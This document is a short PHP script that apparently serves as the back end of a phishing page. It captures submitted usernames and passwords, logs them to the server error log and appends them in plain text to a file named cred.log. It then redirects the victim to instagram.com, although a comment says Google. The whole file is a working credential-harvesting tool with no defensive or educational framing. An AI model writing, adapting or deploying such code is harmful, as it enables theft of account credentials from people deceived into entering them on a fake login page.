<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $subject = $_POST['username'] ?? '(no username)';
    $content = $_POST['password'] ?? '(no password)';

    // log into terminal
    error_log("New Message:\nUsername: $subject\nPassword: $content\n");

    // optionally also save to a file
    $file = 'cred.log';
    file_put_contents($file, "Username: $subject | Password: $content\n", FILE_APPEND);

    // redirect to a real website (Google in this case)
    header("Location: https://www.instagram.com");
    exit;
} else {
    echo "Invalid request.";
}
